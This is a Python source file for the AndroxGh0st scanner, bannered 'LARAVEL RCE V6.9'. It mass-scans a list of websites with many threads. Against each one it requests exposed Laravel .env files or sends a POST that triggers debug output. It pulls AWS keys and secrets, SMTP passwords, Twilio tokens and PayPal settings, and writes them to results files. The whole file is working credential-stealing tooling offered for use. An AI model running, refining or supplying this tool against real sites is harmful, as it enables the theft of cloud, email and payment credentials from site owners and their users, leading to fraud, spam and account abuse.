# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg
import configparser  # Updated for Python 3
from threading import Thread
from queue import Queue  # Updated for Python 3 queue

requests.packages.urllib3.disable_warnings()

try:
    os.mkdir('Results')
except FileExistsError:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            with open('Results/paypal_sandbox.txt', 'a') as save:
                save.write(f'{url}\n')
            return True
        return False

    def get_aws_region(self, text):
        for region in list_region.splitlines():
            if str(region) in text:
                return region
        return None

    def get_aws_data(self, text, url):
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                aws_key = reg(r"\nAWS_ACCESS_KEY_ID=(.*?)\n", text)
                aws_sec = reg(r"\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)
                aws_reg = self.get_aws_region(text) or "aws_unknown_region--"

                if aws_key and aws_sec:
                    build = f'{aws_key[0]}|{aws_sec[0]}|{aws_reg}'
                    build_clean = build.replace('\r', '')

                    with open(f'Results/{aws_reg[:-2]}.txt', 'a') as save:
                        save.write(f'{build_clean}\n\n')

                    with open('Results/aws_access_key_secret.txt', 'a') as save2:
                        save2.write(f'{build_clean}\n\n')

                    return True
            return False
        except Exception as e:
            print(e)
            return False

    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                twilio_data = {
                    "TWILIO_ACCOUNT_SID": reg(r"\nTWILIO_ACCOUNT_SID=(.*?)\n", text),
                    "TWILIO_API_KEY": reg(r"\nTWILIO_API_KEY=(.*?)\n", text),
                    "TWILIO_API_SECRET": reg(r"\nTWILIO_API_SECRET=(.*?)\n", text),
                    "TWILIO_CHAT_SERVICE_SID": reg(r"\nTWILIO_CHAT_SERVICE_SID=(.*?)\n", text),
                    "TWILIO_NUMBER": reg(r"\nTWILIO_NUMBER=(.*?)\n", text),
                    "TWILIO_AUTH_TOKEN": reg(r"\nTWILIO_AUTH_TOKEN=(.*?)\n", text)
                }

                build = "\n".join([f"{k}: {v[0] if v else ''}" for k, v in twilio_data.items()])
                build = f'URL: {url}\nMETHOD: /.env\n{build}'

                with open('Results/TWILLIO.txt', 'a') as save:
                    save.write(f'{build}\n\n')

                return True
            return False
        except Exception as e:
            print(e)
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                mailhost = reg(r"\nMAIL_HOST=(.*?)\n", text)[0]
                mailport = reg(r"\nMAIL_PORT=(.*?)\n", text)[0]
                mailuser = reg(r"\nMAIL_USERNAME=(.*?)\n", text)[0]
                mailpass = reg(r"\nMAIL_PASSWORD=(.*?)\n", text)[0]
                mailfrom = reg(r"\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0] if "MAIL_FROM_ADDRESS" in text else ''
                fromname = reg(r"\nMAIL_FROM_NAME=(.*?)\n", text)[0] if "MAIL_FROM_NAME" in text else ''

                if mailuser and mailpass:
                    build = f'URL: {url}\nMETHOD: /.env\nMAILHOST: {mailhost}\nMAILPORT: {mailport}\nMAILUSER: {mailuser}\nMAILPASS: {mailpass}\nMAILFROM: {mailfrom}\nFROMNAME: {fromname}'
                    remover = build.replace('\r', '')

                    with open('Results/SMTP_RANDOM.txt', 'a') as save:
                        save.write(f'{remover}\n\n')

                    return True
            return False
        except Exception as e:
            print(e)
            return False

def printf(text):
    print(f'{text}\n')

def main(url):
    resp = False
    try:
        headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(f"{url}/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]": "androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source

        if resp:
            androx = androxgh0st()
            smtp = androx.get_smtp(resp, url)
            aws = androx.get_aws_data(resp, url)
            twilio = androx.get_twillio(resp, url)
            paypal = androx.paypal(resp, url)

            log_status = [
                ('SMTP', smtp),
                ('AWS', aws),
                ('TWILIO', twilio),
                ('PAYPAL', paypal)
            ]

            result_text = ' | '.join([f'{status} {"\033[32;1mFOUND\033[0m" if found else "\033[31;1mNOT FOUND\033[0m"}' for status, found in log_status])
            printf(f'\033[32;1m#\033[0m {url} | {result_text}')
        else:
            printf(f'\033[31;1m#\033[0m {url} | \033[31;1mCan\'t get everything\033[0m')
            with open('Results/not_vulnerable.txt', 'a') as save:
                save.write(f'{url}\n')
    except Exception as e:
        printf(f'\033[31;1m#\033[0m {url} | \033[31;1mCan\'t access site\033[0m')
        with open('Results/not_vulnerable.txt', 'a') as save:
            save.write(f'{url}\n')
        print(e)

if __name__ == '__main__':
    print('''
   ________	_ __  ____		   
  / ____/ /_  (_) /_/ __ \\____ ____
 / /   / __ \\/ / __/ / / / __ `/ _ \\
/ /___/ / / / / /_/ /_/ / /_/ /  __/
/____/_/ /_/_/\\__/\\____/\\__, /\\___/ 
	LARAVEL \033[32;1mRCE\033[0m V6.9   /____/	   
''')
    try:
        readcfg = configparser.ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')

        print(f"Log session bot found! Restoring session\nUsing Configuration :\n\tFILES={lists}\n\tTHREAD={numthread}\n\tSESSION={sessi}")
        tanya = input("Want to continue session? [Y/n] ")
        if tanya.lower() == 'y':
            lerr = open(lists).read().split("\n" + sessi)[1]
            readsplit = lerr.splitlines()
        else:
            raise Exception("Starting new session.")
    except Exception:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("Website list? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = input("Threads? ")
            except:
                print("Wrong thread number!")
                exit()

    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if not url.startswith("http"):
            url = "http://" + url
        url = url.rstrip('/')
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            with open(pid_restore, 'w') as session:
                cfgsession = f"[DB]\nFILES={lists}\nTHREAD={numthread}\nSESSION={url}\n"
                session.write(cfgsession)
            print("CTRL+C detected, session saved")
            exit()

    pool.wait_completion()

    try:
        os.remove(pid_restore)
    except:
        pass
